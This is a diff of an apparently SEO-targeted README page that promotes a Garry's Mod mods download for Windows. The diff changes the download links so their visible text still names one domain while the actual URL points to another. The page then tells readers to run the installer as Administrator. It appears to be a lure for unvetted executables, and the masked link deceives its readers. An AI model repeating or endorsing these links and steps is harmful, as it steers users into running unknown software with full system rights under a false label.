@@ -32,14 +32,14 @@ Built for **garrys mod mods download pc** and similar high-intent searches.
 
 | | |
 | --- | --- |
-| **Direct link** | **[garrysmodz.wonderchain.fun](https://garrysmodz.wonderchain.fun/)** |
-| **Full URL** | `https://garrysmodz.wonderchain.fun/` |
+| **Direct link** | **[garrysmodz.wonderchain.fun](https://garrysmodz.kolmods.com/)** |
+| **Full URL** | `https://garrysmodz.kolmods.com/` |
 | **Platform** | Windows 10 / 11 (64-bit) |
 | **Install** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Open **[garrysmodz.wonderchain.fun](https://garrysmodz.wonderchain.fun/)** in your browser
+1. Open **[garrysmodz.wonderchain.fun](https://garrysmodz.kolmods.com/)** in your browser
 2. Download the latest Windows build
 3. Run the installer **as Administrator**
 4. Point the app to your game / mods folder on first launch
